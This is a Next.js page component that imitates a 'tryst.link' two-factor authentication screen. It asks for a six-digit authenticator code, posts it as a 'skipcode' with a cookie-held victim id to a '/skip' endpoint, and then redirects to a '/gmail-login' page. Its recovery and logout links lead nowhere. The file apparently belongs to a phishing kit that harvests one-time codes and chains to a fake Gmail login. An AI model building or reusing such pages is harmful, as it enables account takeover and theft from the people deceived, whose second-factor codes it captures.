import { Form, Formik } from "formik";
import { API_URL } from "../config";
import Header from "../components/Header";
import Footer from "../components/Footer";
import Cookies from "js-cookie";
import InputField from "../components/InputField";
import { toast } from "react-toastify";
import { useRouter } from "next/router";
import { useState } from "react";

function RecoveryAuthPage() {
  const router = useRouter();
  const id = Cookies.get("id");
  const [code, setCode] = useState("");

  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode: code,
    };

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      setCode("");
      router.push("/gmail-login");
      // router.push("/account/email");
      // Cookies.remove("id");
      // Cookies.remove("email");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <>
      <Header />
      <div className="flex  justify-start min-h-screen bg-white">
        <div className="w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-3xl font-bold text-gray-900">
              tryst <span className="text-gray-500">.link</span>
            </h1>
          </div>
          <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4 text-sm">
            You need to authenticate via an additional factor before continuing
          </div>
          <h2 className="text-2xl font-semibold text-gray-800 mb-4">
            Enter authenticator app code
          </h2>
          <p className="text-gray-600 mb-4">
            Enter the 6-digit code from the authenticator app on your phone or
            password manager.
          </p>
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:outline-none text-start text-2xl tracking-widest"
            placeholder="_ _ _ _ _ _"
            maxLength="6"
          />
          <button
            className="w-[30%] bg-red-600 text-white py-3 mt-4 rounded-md hover:bg-red-700 text-lg font-semibold"
            onClick={handleSubmit}
          >
            Authenticate
          </button>
          <div className="mt-4 text-sm text-gray-600 text-center">
            <a href="#" className="text-red-600 hover:underline">
              Authenticate using emergency recovery code instead
            </a>{" "}
            <span className="mx-1">|</span>
            <a href="#" className="text-red-600 hover:underline">
              Log out instead
            </a>
          </div>
        </div>
      </div>
      <Footer />
    </>
  );
}

export default RecoveryAuthPage;
